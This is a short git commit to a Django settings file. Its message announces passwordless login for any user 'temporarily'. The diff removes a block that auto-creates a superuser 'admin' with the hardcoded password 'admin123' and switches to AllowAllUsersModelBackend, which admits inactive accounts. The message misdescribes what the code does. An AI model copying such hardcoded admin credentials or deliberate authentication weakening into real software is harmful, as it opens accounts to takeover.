fd9b859956860bb079efc47ea510213ccf4045bf
prodigy3228 <davranmirsalimov57@gmail.com>
2026-05-26 01:31:16 +0600

    Allow any user to login without password (temporary)

--- backend/delivery_store/settings.py
+++ backend/delivery_store/settings.py
@@ -196,8 +196,4 @@ CORS_ALLOW_HEADERS = [
     'x-requested-with',
 ]
 
-import os
-from django.contrib.auth import get_user_model
-User = get_user_model()
-if not User.objects.filter(username='admin').exists():
-    User.objects.create_superuser('admin', 'admin@example.com', 'admin123')
+AUTHENTICATION_BACKENDS = ['django.contrib.auth.backends.AllowAllUsersModelBackend']
